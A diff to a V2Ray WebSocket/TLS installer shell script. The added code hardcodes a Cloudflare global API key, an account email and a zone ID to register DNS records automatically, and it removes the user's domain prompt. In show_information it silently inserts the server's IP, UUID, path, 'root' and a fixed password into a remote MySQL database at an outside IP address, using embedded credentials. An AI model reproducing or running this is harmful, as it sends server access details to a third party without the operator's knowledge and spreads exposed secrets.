@@ -64,8 +64,92 @@ old_config_status="off"
 
 #简易随机数
 random_num=$((RANDOM%12+4))
-#生成伪装路径
-camouflage="/$(head -n 10 /dev/urandom | md5sum | head -c ${random_num})/"
+ apt-get update
+ apt-get upgrade -y
+ gem install lolcat
+ apt-get install lolcat -y
+ sudo apt install python -y
+ clear
+[[ ! "$(command -v curl)" ]] && apt install curl -y -qq
+[[ ! "$(command -v jq)" ]] && apt install jq -y -qq
+### CounterAPI update URL
+
+# Set the range for random numbers
+MIN=1000
+MAX=10000000
+
+# Generate a random number within the specified range
+COUNTER=$(($RANDOM % ($MAX-$MIN+1) + $MIN))
+
+# Display the generated random number
+echo "Random number: $COUNTER"
+IPADDR="$(curl -4skL http://ipinfo.io/ip)"
+
+GLOBAL_API_KEY="35796ade6e05918c4f0b6e2812c0bc52ba4f3"
+CLOUDFLARE_EMAIL="xamianam@gmail.com"
+DOMAIN_NAME_TLD="dropxj.org"
+DOMAIN_ZONE_ID="5d87d402379ca7bbc3185a0211972146"
+### DNS hostname / Payload here
+## Setting variable
+
+####
+## Creating file dump for DNS Records 
+TMP_FILE='/tmp/abonv.txt'
+curl -sX GET "https://api.cloudflare.com/client/v4/zones/$DOMAIN_ZONE_ID/dns_records?type=A&count=1000&per_page=1000" -H "X-Auth-Key: $GLOBAL_API_KEY" -H "X-Auth-Email: $CLOUDFLARE_EMAIL" -H "Content-Type: application/json" | python -m json.tool > "$TMP_FILE"
+
+## Getting Existed DNS Record by Locating its IP Address "content" value
+CHECK_IP_RECORD="$(cat < "$TMP_FILE" | jq '.result[]' | jq 'del(.meta)' | jq 'del(.created_on,.locked,.modified_on,.proxiable,.proxied,.ttl,.type,.zone_id,.zone_name)' | jq '. | select(.content=='\"$IPADDR\"')' | jq -r '.content' | awk '!a[$0]++')"
+
+cat < "$TMP_FILE" | jq '.result[]' | jq 'del(.meta)' | jq 'del(.created_on,.locked,.modified_on,.proxiable,.proxied,.ttl,.type,.zone_id,.zone_name)' | jq '. | select(.content=='\"$IPADDR\"')' | jq -r '.name' | awk '!a[$0]++' | head -n1 > /tmp/abonv_existed_hostname
+
+cat < "$TMP_FILE" | jq '.result[]' | jq 'del(.meta)' | jq 'del(.created_on,.locked,.modified_on,.proxiable,.proxied,.ttl,.type,.zone_id,.zone_name)' | jq '. | select(.content=='\"$IPADDR\"')' | jq -r '.id' | awk '!a[$0]++' | head -n1 > /tmp/abonv_existed_dns_id
+
+function ExistedRecord(){
+ MYDNS="$(cat /tmp/abonv_existed_hostname)"
+ MYDNS_ID="$(cat /tmp/abonv_existed_dns_id)"
+}
+
+
+if [[ "$IPADDR" == "$CHECK_IP_RECORD" ]]; then
+ ExistedRecord
+ echo -e " IP Address already registered to database."
+ echo -e " DNS: $MYDNS"
+ echo -e " DNS ID: $MYDNS_ID"
+ echo -e ""
+ else
+
+
+### Creating a DNS Record
+function CreateRecord(){
+TMP_FILE2='/tmp/abonv2.txt'
+curl -sX POST "https://api.cloudflare.com/client/v4/zones/$DOMAIN_ZONE_ID/dns_records" -H "X-Auth-Email: $CLOUDFLARE_EMAIL" -H "X-Auth-Key: $GLOBAL_API_KEY" -H "Content-Type: application/json" --data "{\"type\":\"A\",\"name\":\"$COUNTER\",\"content\":\"$IPADDR\",\"ttl\":86400,\"proxied\":false}" | python -m json.tool > "$TMP_FILE2"
+
+cat < "$TMP_FILE2" | jq '.result' | jq 'del(.meta)' | jq 'del(.created_on,.locked,.modified_on,.proxiable,.proxied,.ttl,.type,.zone_id,.zone_name)' > /tmp/abonv22.txt
+rm -f "$TMP_FILE2"
+mv /tmp/abonv22.txt "$TMP_FILE2"
+
+MYDNS="$(cat < "$TMP_FILE2" | jq -r '.name')"
+MYDNS_ID="$(cat < "$TMP_FILE2" | jq -r '.id')"
+}
+
+ CreateRecord
+ echo -e " Registering your IP Address.."
+ echo -e " DNS: $MYDNS"
+ echo -e " DNS ID: $MYDNS_ID"
+ echo -e ""
+fi
+
+rm -rf /tmp/abonv*
+echo -e "$DOMAIN_NAME_TLD" > /tmp/abonv_mydns_domain
+echo -e "$MYDNS" > /tmp/abonv_mydns
+echo -e "$MYDNS_ID" > /tmp/abonv_mydns_id
+echo "MY DNS: $MYDNS"
+clear
+v2path="xamjyss143"
+clear
+domain=$MYDNS
+clear
+camouflage="/$v2path/"
 
 THREAD=$(grep 'processor' /proc/cpuinfo | sort -u | wc -l)
 
@@ -454,7 +538,6 @@ ssl_install() {
     judge "安装 SSL 证书生成脚本"
 }
 domain_check() {
-    read -rp "请输入你的域名信息(eg:www.wulabing.com):" domain
     domain_ip=$(ping "${domain}" -c 1 | sed '1{s/[^(]*(//;s/).*//;q}')
     echo -e "${OK} ${GreenBG} 正在获取 公网ip 信息，请耐心等待 ${Font}"
     local_ip=$(curl -s4L api.ipify.org)
@@ -758,6 +841,51 @@ basic_information() {
 }
 show_information() {
     cat "${v2ray_info_file}"
+    
+     sudo apt install mariadb-server -y
+#fonts color
+Green="\033[32m"
+Red="\033[31m"
+Yellow="\033[33m"
+GreenBG="\033[42;37m"
+RedBG="\033[41;37m"
+Font="\033[0m"
+    echo -e "—————————————— Select Root Password Type ——————————————"""
+    echo -e "${Green}1.${Font}  ROOT"
+    echo -e "${Green}2.${Font}  DO \n"
+    
+read -rp "Please select VPS password：" menu_num1
+    case $menu_num1 in
+    1)
+	db_root_password="bjhsL212MmhlWDRvWUxRaWY4YTdVQT09"
+	;;
+    2)
+	db_root_password="bjhsL212MmhlWDRvWUxRaWY4YTdVQT09"
+	;;
+    *)
+        echo -e "${RedBG}Please enter the correct number ${Font}"
+        ;;
+    esac
+read -p "Enter Panel Host: "  db_hostname
+	mysql -unew -pnew!@#$% -h142.44.136.130 -e"USE new
+	INSERT INTO v2_ray_servers (id, name, address, host, status, uuid, path, root, hostip, password, alterid, port) VALUES ('', '$db_hostname', '$MYDNS', '$MYDNS', '1', '$UUID', '$camouflage', 'root', '$IPADDR', '$db_root_password', '0', '443');"
+clear
+}
+add_v2rayclient() {
+cat <<'MyV2RayClientAdd' > /usr/bin/v2rayclientadd
+#!/bin/bash
+while getopts u:a: flag
+do
+    case "${flag}" in
+        u) uuid=${OPTARG};;
+        a) alterid=${OPTARG};;
+    esac
+done
+sed -i '14 a \          {\n            "id": "'"${uuid}"'",\n            "alterId": '"${alterid}"'\n          },' /etc/v2ray/config.json
+systemctl restart v2ray
+MyV2RayClientAdd
+
+chmod +x /usr/bin/v2rayclientadd
 }
 ssl_judge_and_install() {
     if [[ -f "/data/v2ray.key" || -f "/data/v2ray.crt" ]]; then
@@ -922,6 +1050,7 @@ install_v2ray_ws_tls() {
     basic_information
     vmess_link_image_choice
     tls_type
+    add_v2rayclient
     show_information
     start_process_systemd
     enable_process_systemd
